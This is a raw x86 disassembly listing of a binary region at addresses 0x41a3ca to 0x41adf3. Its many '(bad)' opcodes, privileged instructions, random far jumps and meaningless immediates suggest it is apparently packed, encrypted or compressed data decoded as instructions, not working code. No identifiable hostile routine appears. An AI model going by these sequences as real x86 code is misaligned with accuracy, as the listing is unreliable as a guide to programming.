  41a3ca:	aaa    
  41a3cb:	imul   eax,DWORD PTR [esi+edi*1-0x4b],0x7b
  41a3d0:	mov    ?,WORD PTR [edx+esi*4+0x58f602d3]
  41a3d7:	mov    eax,0xb1a9809f
  41a3dc:	mov    esi,0x3bc572c1
  41a3e1:	ja     0x41a45b
  41a3e3:	mov    DWORD PTR [ebx],esp
  41a3e5:	(bad)  
  41a3e6:	push   ss
  41a3e7:	pop    eax
  41a3e8:	pushf  
  41a3e9:	mov    al,0x4e
  41a3eb:	ss sub al,0x42
  41a3ee:	mov    dh,dh
  41a3f0:	xchg   ecx,eax
  41a3f1:	pop    esi
  41a3f2:	(bad)  
  41a3f3:	xchg   ecx,eax
  41a3f4:	fs push 0x5b
  41a3f7:	pavgw  mm5,QWORD PTR [eax*4-0x5ba6a56]
  41a3ff:	push   esp
  41a400:	imul   esi,DWORD PTR [ecx],0xfffffffe
  41a403:	dec    eax
  41a404:	sbb    al,0x42
  41a406:	push   0x105e1def
  41a40b:	mov    bl,BYTE PTR ds:0x59f5a6ba
  41a411:	loope  0x41a39a
  41a413:	adc    al,0x82
  41a415:	inc    ebx
  41a416:	mov    edx,0x117e6b49
  41a41b:	mov    eax,ds:0xe278aeab
  41a420:	jp     0x41a3a4
  41a422:	stc    
  41a423:	loopne 0x41a3ca
  41a425:	je     0x41a464
  41a427:	retf   
  41a428:	sub    dh,BYTE PTR [eax]
  41a42a:	sub    bl,BYTE PTR [edi+0x65ebd005]
  41a430:	sub    BYTE PTR [edx-0x44],0xb3
  41a434:	int3   
  41a435:	ss retf 
  41a437:	(bad)  
  41a438:	pusha  
  41a439:	jmp    0xb744d230
  41a43e:	cs inc ebx
  41a440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a441:	jmp    0x41a455
  41a443:	test   ah,dh
  41a445:	outs   dx,DWORD PTR ds:[esi]
  41a446:	fldenv [esp+ecx*4-0x59cda70b]
  41a44d:	dec    edx
  41a44e:	leave  
  41a44f:	mov    cl,0xee
  41a451:	shl    esi,cl
  41a453:	sub    dl,cl
  41a455:	popa   
  41a456:	fs mov dl,0x2a
  41a459:	pop    ebx
  41a45a:	sbb    BYTE PTR [esi+0x657d943d],al
  41a460:	xor    dl,dh
  41a462:	cli    
  41a463:	dec    esp
  41a464:	or     BYTE PTR [eax],bh
  41a466:	jge    0x41a4bc
  41a468:	int3   
  41a469:	push   ebx
  41a46a:	jns    0x41a4c6
  41a46c:	mov    esi,0xc3b1fab2
  41a471:	in     eax,dx
  41a472:	inc    ebx
  41a473:	icebp  
  41a474:	inc    ecx
  41a475:	enter  0x7acc,0x86
  41a479:	enter  0xd071,0x70
  41a47d:	mov    ah,0xfb
  41a47f:	pushf  
  41a480:	jle    0x41a48f
  41a482:	aaa    
  41a483:	mov    ds:0xe3bc40cf,eax
  41a488:	popa   
  41a489:	push   ss
  41a48a:	add    ebp,edi
  41a48c:	jae    0x41a4d5
  41a48e:	or     BYTE PTR [ebp+0x27],bh
	...
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	scas   al,BYTE PTR es:[edi]
  41a501:	pop    esi
  41a502:	mov    bl,0x3b
  41a504:	xor    BYTE PTR [edi],dl
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    eax,0x65000001
  41a50d:	inc    eax
  41a50e:	dec    esi
  41a50f:	jb     0x41a551
  41a511:	mov    WORD PTR [esi],es
  41a513:	and    edx,DWORD PTR [edi+0x5]
  41a516:	jl     0x41a52b
  41a518:	adc    edx,DWORD PTR [edx+0x4f]
  41a51b:	mov    bh,0x81
  41a51d:	lods   eax,DWORD PTR ds:[esi]
  41a51e:	or     DWORD PTR [esi],ecx
  41a520:	bound  esi,QWORD PTR [ebp+eiz*2+0x66]
  41a524:	mov    ds,WORD PTR [eax-0x21]
  41a527:	jae    0x41a550
  41a529:	enter  0x2961,0x6d
  41a52d:	inc    esi
  41a52e:	arpl   WORD PTR [ebx-0x3c],bp
  41a531:	xor    BYTE PTR [esi],dl
  41a533:	fadd   DWORD PTR [edx]
  41a535:	mov    esp,0xa118f617
  41a53a:	neg    DWORD PTR [edx]
  41a53c:	icebp  
  41a53d:	jp     0x41a4c2
  41a53f:	test   al,0xb3
  41a541:	neg    BYTE PTR [ebx]
  41a543:	ins    BYTE PTR es:[edi],dx
  41a544:	adc    dh,BYTE PTR [esi]
  41a546:	rdmsr  
  41a548:	adc    al,0xa9
  41a54a:	stos   DWORD PTR es:[edi],eax
  41a54b:	adc    esp,DWORD PTR [ecx-0x4f5f21b1]
  41a551:	ss mov dl,0xf
  41a554:	inc    ebx
  41a555:	ds mov esi,0xa7aadc44
  41a55b:	ins    BYTE PTR es:[edi],dx
  41a55c:	inc    ebx
  41a55d:	jnp    0x41a50a
  41a55f:	xor    al,0x2d
  41a561:	call   0xa9f1:0x12ba0a9a
  41a568:	ret    0x67ec
  41a56b:	mov    cl,0x76
  41a56d:	push   ss
  41a56e:	pusha  
  41a56f:	dec    ecx
  41a570:	icebp  
  41a571:	nop
  41a572:	xlat   BYTE PTR ds:[ebx]
  41a573:	push   edx
  41a574:	mov    gs:0x7176dd7,al
  41a57a:	lahf   
  41a57b:	xchg   edx,eax
  41a57c:	mov    dl,0xc
  41a57e:	scas   al,BYTE PTR es:[edi]
  41a57f:	sub    eax,0x80b824cb
  41a584:	xchg   esp,eax
  41a585:	pop    edi
  41a586:	xchg   edi,eax
  41a587:	push   ecx
  41a588:	xchg   BYTE PTR [edx+0x5a],al
  41a58b:	pop    eax
  41a58c:	ins    DWORD PTR es:[edi],dx
  41a58d:	add    ecx,DWORD PTR [esp+ebx*1]
  41a590:	and    DWORD PTR [esp+edx*4],esi
  41a593:	jle    0x41a5a2
  41a595:	cwde   
  41a596:	adc    BYTE PTR [ebp+0x36],0xc7
  41a59a:	repnz std 
  41a59c:	arpl   WORD PTR [edi-0x2a],sp
  41a59f:	stos   BYTE PTR es:[edi],al
  41a5a0:	mov    dh,0xcf
  41a5a2:	mov    edx,0x605779dd
  41a5a7:	test   eax,0x69bf6c35
  41a5ac:	shl    DWORD PTR [esi+0x3],0xc9
  41a5b0:	dec    ecx
  41a5b1:	push   0xda8b8ebe
  41a5b6:	xchg   esp,eax
  41a5b7:	push   esi
  41a5b8:	ds dec eax
  41a5ba:	jp     0x41a5f7
  41a5bc:	test   DWORD PTR es:[esi+0x7206930d],ebp
  41a5c3:	xlat   BYTE PTR ss:[ebx]
  41a5c5:	fisttp QWORD PTR [edx+0x4b]
  41a5c8:	cli    
  41a5c9:	test   BYTE PTR ds:0x7fb6152b,0x42
  41a5d0:	pushf  
  41a5d1:	push   0xbcfe5ac9
  41a5d6:	js     0x41a57b
  41a5d8:	scas   al,BYTE PTR es:[edi]
  41a5d9:	rcl    DWORD PTR [edi-0x56e0e1c8],1
  41a5df:	xor    BYTE PTR ds:0xcc4d558d,ah
  41a5e5:	push   0x167aa326
  41a5ea:	pop    edx
  41a5eb:	xchg   ebx,eax
  41a5ec:	and    ch,0x6d
  41a5ef:	retf   
  41a5f0:	loopne 0x41a5db
  41a5f2:	fs popa 
  41a5f4:	jl     0x41a5ce
  41a5f6:	xchg   esi,eax
  41a5f7:	add    ecx,DWORD PTR [edi]
  41a5f9:	mov    edi,DWORD PTR [ecx-0x156dc010]
  41a5ff:	mov    eax,ds:0x17f97d9a
  41a604:	jle    0x41a595
  41a606:	push   0x2d85f66d
  41a60b:	aas    
  41a60c:	inc    eax
  41a60d:	fcomp  DWORD PTR [ebx+0xe636]
	...
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xdcda625
  41a682:	aaa    
  41a683:	cmp    DWORD PTR ds:0x5000118,esi
  41a689:	add    DWORD PTR [eax],eax
  41a68b:	add    BYTE PTR [ebx+ecx*8+0x3],cl
  41a68f:	xchg   BYTE PTR ds:0x3756e376,bh
  41a695:	call   0x9562:0xd1988f7b
  41a69c:	sub    DWORD PTR [ebx+eiz*2-0x5316d2c0],edi
  41a6a3:	add    DWORD PTR [edx+0x12],0x4c
  41a6a7:	imul   ebp,DWORD PTR [esi],0x45
  41a6aa:	xlat   BYTE PTR ds:[ebx]
  41a6ab:	daa    
  41a6ac:	mov    ds:0xcafc5c32,al
  41a6b1:	or     eax,0x6d6466a4
  41a6b6:	xchg   edi,eax
  41a6b7:	jmp    FWORD PTR [edi+ecx*1]
  41a6ba:	sti    
  41a6bb:	js     0x41a6a3
  41a6bd:	cmp    al,0x67
  41a6bf:	sbb    esi,DWORD PTR [ecx+ebp*1+0x7d]
  41a6c3:	fst    QWORD PTR [esi-0xe]
  41a6c6:	ja     0x41a6b3
  41a6c8:	hlt    
  41a6c9:	or     eax,0xcea85b49
  41a6ce:	and    BYTE PTR [edx],ch
  41a6d0:	dec    esp
  41a6d1:	in     al,dx
  41a6d2:	mul    BYTE PTR [eax+0x10]
  41a6d5:	pop    esp
  41a6d6:	push   eax
  41a6d7:	int    0x4d
  41a6d9:	imul   esp,esi,0x2fa91eb4
  41a6df:	daa    
  41a6e0:	js     0x41a6c3
  41a6e2:	pop    esp
  41a6e3:	sbb    dh,BYTE PTR [ebx-0x67b8c7ef]
  41a6e9:	repz xor eax,0x64b34d24
  41a6ef:	xor    cl,BYTE PTR [eax-0x321fe114]
  41a6f5:	fisubr WORD PTR [ebx-0x43ceb165]
  41a6fb:	cs adc ebx,eax
  41a6fe:	jne    0x41a703
  41a700:	(bad)  
  41a701:	in     al,dx
  41a702:	call   0xf357fdab
  41a707:	mov    bl,0x9e
  41a709:	or     ebp,DWORD PTR [ecx+0x24d6a586]
  41a70f:	sbb    DWORD PTR [edi],0xffffffef
  41a712:	addr16 push ebx
  41a714:	pcmpeqb mm7,mm4
  41a717:	dec    esi
  41a718:	or     ch,BYTE PTR [eax+0x63]
  41a71b:	fpatan 
  41a71d:	add    al,0x6f
  41a71f:	ret    0xa270
  41a722:	sub    eax,0x83eb14a2
  41a727:	shl    BYTE PTR [ebx+0x2],0xbf
  41a72b:	xor    al,0x12
  41a72d:	ss inc eax
  41a72f:	dec    ecx
  41a730:	mov    al,0xb8
  41a732:	or     al,0xd0
  41a734:	xchg   esi,eax
  41a735:	or     ebp,DWORD PTR [edx+0x21]
  41a738:	stos   DWORD PTR es:[edi],eax
  41a739:	pop    es
  41a73a:	(bad)  
  41a73b:	and    ebp,DWORD PTR [esi+esi*4-0x31]
  41a73f:	call   0x982c:0x2892be13
  41a746:	push   0x21af2994
  41a74b:	pop    esi
  41a74c:	xor    al,0x39
  41a74e:	jbe    0x41a75d
  41a750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a751:	pop    esp
  41a752:	jmp    0xa670f1fc
  41a757:	pushf  
  41a758:	fmul   DWORD PTR [esi+0x691f8023]
  41a75e:	xchg   ebx,eax
  41a75f:	dec    ecx
  41a760:	lods   al,BYTE PTR ds:[esi]
  41a761:	jle    0x41a776
  41a763:	loopne 0x41a734
  41a765:	loop   0x41a71c
  41a767:	das    
  41a768:	(bad)  
  41a769:	jns    0x41a75d
  41a76b:	retf   
  41a76c:	adc    BYTE PTR [edi],bh
  41a76e:	inc    eax
  41a76f:	mov    bh,0xde
  41a771:	push   esp
  41a772:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a774:	out    0x27,al
  41a776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a777:	xchg   edi,eax
  41a778:	retf   0x97b5
  41a77b:	add    esi,ecx
  41a77d:	lahf   
  41a77e:	mov    esi,0x196f532f
  41a783:	ficomp WORD PTR [ebx+0xe]
  41a786:	retf   0xb676
  41a789:	out    dx,eax
  41a78a:	aas    
  41a78b:	int3   
  41a78c:	sub    al,0xb6
  41a78e:	call   0x0:0x3e1a
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xa45327ca,al
  41a801:	in     eax,0x33
  41a803:	loop   0x41a83f
  41a805:	sbb    DWORD PTR [ecx],eax
  41a807:	add    BYTE PTR ds:0x44000001,al
  41a80d:	xor    BYTE PTR [edi-0x7813db6d],dl
  41a813:	or     esp,DWORD PTR ds:0x15421359
  41a819:	popf   
  41a81a:	adc    eax,0xf26480eb
  41a81f:	sbb    BYTE PTR [esi-0x74fa8ae1],ch
  41a825:	jae    0x41a7b5
  41a827:	int3   
  41a828:	mov    es,WORD PTR [ecx-0x2f]
  41a82b:	(bad)  
  41a82c:	call   FWORD PTR [eax+0x12]
  41a82f:	loope  0x41a869
  41a831:	mov    dh,0x99
  41a833:	mov    al,0x11
  41a835:	fsub   QWORD PTR [esp+eax*2-0x60]
  41a839:	push   edi
  41a83a:	mov    ecx,edx
  41a83c:	imul   ebx,DWORD PTR [ebx+0x20],0x9e67e8e6
  41a843:	adc    al,0x89
  41a845:	pusha  
  41a846:	jno    0x41a850
  41a848:	or     DWORD PTR [di],0x5a
  41a84c:	(bad)  
  41a84d:	push   ds
  41a84e:	and    eax,0x912907b2
  41a853:	jle    0x41a8b9
  41a855:	int3   
  41a856:	pop    edi
  41a857:	mov    eax,ds:0x1d293d15
  41a85c:	shl    DWORD PTR [ebp-0x36],0x9b
  41a860:	bound  esp,QWORD PTR [ecx+0x44]
  41a863:	ret    
  41a864:	mov    ecx,DWORD PTR [eax-0x61]
  41a867:	sub    BYTE PTR [ebx-0x6c149890],cl
  41a86d:	adc    BYTE PTR [esi],ah
  41a86f:	cmp    ah,BYTE PTR [esi]
  41a871:	jb     0x41a8a2
  41a873:	lea    ebx,[esi+0x79]
  41a876:	push   esi
  41a877:	sub    ebx,ebx
  41a879:	pop    ebp
  41a87a:	fcmovnu st,st(0)
  41a87c:	dec    ebx
  41a87d:	xchg   edi,eax
  41a87e:	push   esi
  41a87f:	sbb    ecx,eax
  41a881:	pop    ss
  41a882:	jae    0x41a815
  41a884:	in     al,dx
  41a885:	std    
  41a886:	xor    eax,0x90dbf68d
  41a88b:	cmp    ebp,DWORD PTR [ebp*1+0x1eceaf5e]
  41a892:	mov    ds:0x508990a8,eax
  41a897:	and    eax,0x2ab0c49
  41a89c:	aad    0x1c
  41a89e:	test   BYTE PTR [ecx],bh
  41a8a0:	repz int 0xe1
  41a8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8a4:	sbb    eax,DWORD PTR [bx+di]
  41a8a7:	dec    ebp
  41a8a8:	out    dx,eax
  41a8a9:	xchg   edx,eax
  41a8aa:	mov    eax,0xcc2c1007
  41a8af:	cli    
  41a8b0:	lds    ebp,FWORD PTR ds:0x542e7ead
  41a8b6:	pop    ss
  41a8b7:	shl    dl,0xeb
  41a8ba:	stc    
  41a8bb:	adc    BYTE PTR [edx+0x47f5c1b2],al
  41a8c1:	pop    ss
  41a8c2:	cmp    edi,ebx
  41a8c4:	sub    eax,esp
  41a8c6:	mov    edx,0xc6b88496
  41a8cb:	pop    ds
  41a8cc:	leave  
  41a8cd:	(bad)  
  41a8cf:	imul   edx,DWORD PTR [eax],0x41
  41a8d2:	mov    BYTE PTR [ebx-0x37],bh
  41a8d5:	std    
  41a8d6:	ss call 0x709f775c
  41a8dc:	push   es
  41a8dd:	xchg   ebx,eax
  41a8de:	sahf   
  41a8df:	xor    BYTE PTR [ebp+esi*1-0x15],ah
  41a8e3:	out    0xf6,al
  41a8e5:	xor    al,0xb
  41a8e7:	pop    edi
  41a8e8:	push   esp
  41a8e9:	pusha  
  41a8ea:	arpl   WORD PTR [ecx],ax
  41a8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8ed:	dec    eax
  41a8ee:	in     al,dx
  41a8ef:	add    ah,BYTE PTR [edi-0x274a6ac5]
  41a8f5:	out    0xf8,al
  41a8f7:	enter  0xde60,0x4d
  41a8fb:	push   edx
  41a8fc:	out    dx,eax
  41a8fd:	sub    DWORD PTR gs:[esi-0x104311b9],edi
  41a904:	fimul  WORD PTR [ebx]
  41a906:	add    DWORD PTR [ecx+ebp*8+0x45],ecx
  41a90a:	mov    al,ds:0x4fc6b7f
  41a90f:	in     al,0xbe
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	push   esp
  41a981:	mov    eax,0x1a3fa0c0
  41a986:	add    DWORD PTR [eax],eax
  41a988:	add    eax,0x1000001
  41a98d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a98e:	stos   DWORD PTR es:[edi],eax
  41a98f:	loopne 0x41a920
  41a991:	ja     0x41a9da
  41a993:	iret   
  41a994:	fadd   st,st(2)
  41a996:	fnstenv [edi]
  41a998:	popf   
  41a999:	bound  edi,QWORD PTR [esp+edi*4+0x70788e5c]
  41a9a0:	ins    BYTE PTR es:[edi],dx
  41a9a1:	retf   0x3596
  41a9a4:	shr    WORD PTR ds:0x3cfab631,1
  41a9ab:	inc    esp
  41a9ac:	xor    ch,al
  41a9ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9af:	push   ebp
  41a9b0:	std    
  41a9b1:	inc    esp
  41a9b2:	mov    ds:0x1e580402,al
  41a9b7:	rcr    DWORD PTR ds:0xa8933edf,0xeb
  41a9be:	es push eax
  41a9c0:	in     eax,dx
  41a9c1:	inc    ebx
  41a9c2:	sbb    esp,edi
  41a9c4:	wrmsr  
  41a9c6:	lahf   
  41a9c7:	mov    bh,0x28
  41a9c9:	(bad)  [esi-0x26]
  41a9cc:	std    
  41a9cd:	sti    
  41a9ce:	aad    0x5d
  41a9d0:	mov    WORD PTR [edi+0x5],es
  41a9d3:	cmp    BYTE PTR [ebp+0x23104635],0x44
  41a9da:	add    bh,BYTE PTR [edi-0x16]
  41a9dd:	sbb    dl,BYTE PTR [edx+0x74]
  41a9e0:	pop    edx
  41a9e1:	mov    ch,BYTE PTR [esi+0x69c9f780]
  41a9e7:	cmp    al,0xcb
  41a9e9:	xchg   ebp,eax
  41a9ea:	add    dl,BYTE PTR [eax-0x4e]
  41a9ed:	aam    0x6c
  41a9ef:	es loopne 0x41a9be
  41a9f2:	sbb    edi,esi
  41a9f4:	ds dec ebp
  41a9f6:	xor    esi,DWORD PTR [ecx]
  41a9f8:	jne    0x41aa21
  41a9fa:	add    eax,0x6286b6fb
  41a9ff:	das    
  41aa00:	(bad)  
  41aa01:	jle    0x41aa6f
  41aa03:	xor    eax,DWORD PTR [ecx]
  41aa05:	imul   ecx,DWORD PTR [ebp-0x1c],0xbe65c6d
  41aa0c:	mov    ds:0x299265ff,al
  41aa11:	xlat   BYTE PTR ds:[ebx]
  41aa12:	bound  esi,QWORD PTR [edx+0x12]
  41aa15:	(bad)  
  41aa16:	(bad)  
  41aa17:	stc    
  41aa18:	pop    ecx
  41aa19:	retf   
  41aa1a:	mov    fs:0x266abfde,al
  41aa20:	push   ss
  41aa21:	adc    al,0xa7
  41aa23:	in     eax,0x7f
  41aa25:	test   eax,0x43fffabb
  41aa2a:	pop    esp
  41aa2b:	ficom  WORD PTR [ecx-0x7b]
  41aa2e:	and    al,ah
  41aa30:	rol    BYTE PTR [edi],cl
  41aa32:	add    al,0xe8
  41aa34:	test   eax,0x27a82590
  41aa39:	pop    edx
  41aa3a:	(bad)  
  41aa3c:	adc    eax,0x52d19397
  41aa41:	jbe    0x41aa48
  41aa43:	pop    ss
  41aa44:	in     al,dx
  41aa45:	outs   dx,DWORD PTR ds:[esi]
  41aa46:	add    eax,0x8a83540a
  41aa4b:	xor    DWORD PTR [eax],esi
  41aa4d:	loope  0x41aaa6
  41aa4f:	fs in  al,dx
  41aa51:	jg     0x41aaa0
  41aa53:	(bad)  
  41aa54:	or     bl,al
  41aa56:	sub    edi,DWORD PTR [ecx+0x1f]
  41aa59:	pop    ss
  41aa5a:	xchg   edi,eax
  41aa5b:	or     DWORD PTR [esi-0x5],edi
  41aa5e:	pop    edx
  41aa5f:	sbb    DWORD PTR [esi-0x397e7877],edi
  41aa65:	sub    DWORD PTR [ecx+0x4e826795],eax
  41aa6b:	mov    cl,0xd0
  41aa6d:	ret    
  41aa6e:	cs sbb eax,0x2b5a4b07
  41aa74:	out    0xcc,eax
  41aa76:	pop    eax
  41aa77:	mov    cl,0xb1
  41aa79:	push   edx
  41aa7a:	or     eax,0x47e57e8a
  41aa80:	scas   eax,DWORD PTR es:[edi]
  41aa81:	mov    ch,0x2f
  41aa83:	loope  0x41aa71
  41aa85:	pushf  
  41aa86:	test   al,0x17
  41aa88:	(bad)  
  41aa89:	leave  
  41aa8a:	ins    DWORD PTR es:[edi],dx
  41aa8b:	mov    edx,0x36b94f4a
  41aa90:	push   ds
	...
  41aaf1:	add    BYTE PTR [eax],al
  41aaf3:	add    bh,dh
  41aaf5:	add    esp,ebx
  41aaf7:	mov    ah,0xfe
  41aaf9:	std    
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	aam    0xc5
  41ab02:	xchg   eax,ecx
  41ab04:	inc    esp
  41ab05:	sbb    eax,DWORD PTR [ecx]
  41ab07:	add    BYTE PTR ds:0x59000001,al
  41ab0d:	inc    ebx
  41ab0e:	int    0xb
  41ab10:	pop    edi
  41ab11:	inc    esp
  41ab12:	add    eax,DWORD PTR [ebx-0x4]
  41ab15:	push   edx
  41ab16:	in     eax,dx
  41ab17:	(bad)  
  41ab18:	not    edx
  41ab1a:	cdq    
  41ab1b:	inc    edi
  41ab1c:	or     al,0xf1
  41ab1e:	cdq    
  41ab1f:	dec    ebp
  41ab20:	add    eax,0xc67ffd14
  41ab25:	in     eax,0xd9
  41ab27:	or     bh,bh
  41ab29:	or     ch,BYTE PTR [edi-0x622a4558]
  41ab2f:	stc    
  41ab30:	adc    cl,ah
  41ab32:	mov    fs,WORD PTR [edx+ecx*4-0x1ac77460]
  41ab39:	or     BYTE PTR [ecx-0x2535612a],cl
  41ab3f:	inc    esi
  41ab40:	mov    al,ds:0x76554a7a
  41ab45:	mov    dl,0x5f
  41ab47:	and    esp,DWORD PTR [edx+0x27]
  41ab4a:	xchg   edi,eax
  41ab4b:	es loop 0x41aaed
  41ab4e:	add    esp,edi
  41ab50:	push   ebx
  41ab51:	cmp    BYTE PTR [edi],dh
  41ab53:	push   eax
  41ab54:	arpl   WORD PTR [ecx-0x7bf1e222],di
  41ab5a:	push   edi
  41ab5b:	mov    eax,ds:0x78e290a7
  41ab60:	imul   esp,DWORD PTR [edx],0x9f69808a
  41ab66:	push   ebp
  41ab67:	inc    esi
  41ab68:	popf   
  41ab69:	xor    esi,eax
  41ab6b:	ins    DWORD PTR es:[edi],dx
  41ab6c:	or     eax,0xcd7f4f92
  41ab71:	es inc eax
  41ab73:	sbb    esp,eax
  41ab75:	pop    ebp
  41ab76:	and    BYTE PTR [ebp+0x17],0xb9
  41ab7a:	jmp    0x7a55:0x992802e9
  41ab81:	cmp    esi,edi
  41ab83:	push   esp
  41ab84:	out    dx,al
  41ab85:	iret   
  41ab86:	cmp    BYTE PTR [eax],ch
  41ab88:	cmp    edi,ebx
  41ab8a:	in     eax,dx
  41ab8b:	es push 0x2ab27023
  41ab91:	fptan  
  41ab93:	dec    ebx
  41ab94:	gs out dx,al
  41ab96:	iret   
  41ab97:	xchg   ebp,eax
  41ab98:	mul    DWORD PTR [edx+0x1c2208fa]
  41ab9e:	(bad)  
  41ab9f:	sahf   
  41aba0:	or     eax,0xb0b0911e
  41aba5:	adc    DWORD PTR [esi],ebp
  41aba7:	mov    dh,0x3e
  41aba9:	adc    BYTE PTR [ebp+0x66],ch
  41abac:	mov    cl,0x16
  41abae:	scas   al,BYTE PTR es:[edi]
  41abaf:	cmp    ecx,DWORD PTR [ecx+0x45]
  41abb2:	lahf   
  41abb3:	or     BYTE PTR [ebp-0x41],cl
  41abb6:	das    
  41abb7:	and    eax,0x2fc57cf3
  41abbc:	rcl    BYTE PTR [esi],1
  41abbe:	pop    edx
  41abbf:	mov    ah,0xe4
  41abc1:	sub    al,0xe0
  41abc3:	jge    0x41ac08
  41abc5:	jo     0x41ac10
  41abc7:	hlt    
  41abc8:	and    ebp,DWORD PTR [edi+0x1aa250c1]
  41abce:	jecxz  0x41ab62
  41abd0:	out    dx,al
  41abd1:	add    DWORD PTR [eax+0x1a],ebx
  41abd4:	enter  0x580,0x7
  41abd8:	lds    bx,DWORD PTR [ebx+0x3ec391c8]
  41abdf:	icebp  
  41abe0:	xor    eax,0xc6bbec9f
  41abe5:	sahf   
  41abe6:	mov    dl,0x23
  41abe8:	js     0x41ab82
  41abea:	data16 mov fs,WORD PTR [esi+0x15]
  41abee:	das    
  41abef:	sub    edx,DWORD PTR [esi-0x69]
  41abf2:	xchg   edx,eax
  41abf3:	pop    ss
  41abf4:	xchg   ebp,eax
  41abf5:	gs sub esp,edi
  41abf8:	xchg   ecx,eax
  41abf9:	inc    esi
  41abfa:	inc    edx
  41abfb:	jb     0x41abbc
  41abfd:	cwde   
  41abfe:	out    dx,eax
  41abff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac00:	cmc    
  41ac01:	xor    esi,DWORD PTR [esi+0x3e]
  41ac04:	or     al,0x2e
  41ac06:	repz fcomp DWORD PTR [edx+eax*4]
  41ac0a:	imul   eax,edi,0x18
  41ac0d:	sub    eax,0x49c487
	...
  41ac72:	add    BYTE PTR [eax],al
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [edx+ebp*2+0x1d]
  41ac82:	cmc    
  41ac83:	ror    BYTE PTR [ecx+0x1c],1
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    eax,0xb4000001
  41ac8d:	mov    ah,0x6e
  41ac8f:	xor    esp,ecx
  41ac91:	nop
  41ac92:	sbb    ah,bl
  41ac94:	call   0xf237:0x993ed43d
  41ac9b:	jb     0x41ac4f
  41ac9d:	shl    esp,cl
  41ac9f:	mov    edx,0x5a0caf86
  41aca4:	push   esp
  41aca5:	jae    0x41acca
  41aca7:	cmp    dh,BYTE PTR [esi-0x66b438b]
  41acad:	cld    
  41acae:	aad    0x29
  41acb0:	ds pop esp
  41acb2:	add    eax,0xb9097493
  41acb7:	enter  0x50e0,0x28
  41acbb:	cmp    al,0x88
  41acbd:	mov    ah,0x4
  41acbf:	xchg   eax,esi
  41acc1:	adc    eax,0x33130794
  41acc6:	sub    DWORD PTR [eax-0x6e4c3403],0x72486551
  41acd0:	imul   ebx,DWORD PTR [esi-0x32],0xa9c3f803
  41acd7:	inc    ecx
  41acd8:	pop    edi
  41acd9:	mov    esi,0x7ea7bc1a
  41acde:	or     ecx,edx
  41ace0:	imul   esp,DWORD PTR [ebx+esi*1+0x57],0x11f2720c
  41ace8:	adc    al,0x57
  41acea:	div    BYTE PTR [esp+ecx*8-0x42]
  41acee:	test   BYTE PTR [ecx-0x2a],ch
  41acf1:	mov    dl,0xa2
  41acf3:	cs loope 0x41ad0b
  41acf6:	pop    ss
  41acf7:	push   ecx
  41acf8:	mov    al,ds:0x9facb430
  41acfd:	repnz dec edx
  41acff:	adc    eax,0xb16e8482
  41ad04:	sub    esp,DWORD PTR [eax+ebp*2-0x5f]
  41ad08:	dec    DWORD PTR [esi+eiz*2+0x274cfffb]
  41ad0f:	mov    DWORD PTR [eax-0x29ec6198],edi
  41ad15:	loope  0x41aced
  41ad17:	fmul   QWORD PTR [ebx]
  41ad19:	es repnz xchg ebp,eax
  41ad1c:	jnp    0x41ad1e
  41ad1e:	daa    
  41ad1f:	or     al,BYTE PTR [ecx+0x12]
  41ad22:	mov    edi,0xcd87e8db
  41ad27:	jae    0x41aceb
  41ad29:	das    
  41ad2a:	inc    ecx
  41ad2b:	pop    ebp
  41ad2c:	lds    edx,FWORD PTR [ebp-0xf]
  41ad2f:	retf   0xf8e1
  41ad32:	jg     0x41ad61
  41ad34:	hlt    
  41ad35:	div    BYTE PTR [edx]
  41ad37:	icebp  
  41ad38:	sahf   
  41ad39:	cwde   
  41ad3a:	pop    edi
  41ad3b:	shl    BYTE PTR [edi+0x51],1
  41ad3e:	(bad)  
  41ad40:	out    dx,al
  41ad41:	repz inc ecx
  41ad43:	xor    eax,0xa9418741
  41ad48:	adc    eax,0xcf1985da
  41ad4d:	push   ebx
  41ad4e:	xchg   ah,cl
  41ad50:	(bad)  
  41ad51:	stos   BYTE PTR es:[edi],al
  41ad52:	pop    edx
  41ad53:	sar    DWORD PTR [eax-0x12d6c53c],1
  41ad59:	jne    0x41adc2
  41ad5b:	sbb    BYTE PTR [esi+0x61fa36cc],0x55
  41ad62:	call   0xd1de:0xe059bc12
  41ad69:	rcl    BYTE PTR [ecx+0x1e9d0d8f],0x84
  41ad70:	inc    esp
  41ad71:	jmp    0x409d6754
  41ad76:	push   ss
  41ad77:	lock les ebx,FWORD PTR ds:0x3e1b793b
  41ad7e:	adc    DWORD PTR [edi],ecx
  41ad80:	sti    
  41ad81:	adc    BYTE PTR [eax+0x3dabf62e],al
  41ad87:	xchg   ch,ch
  41ad89:	call   0xe614a00e
  41ad8e:	xor    BYTE PTR gs:[ecx+0x0],0x0
	...
  41adf3:	add    BYTE PTR [ebp-0x8],dl
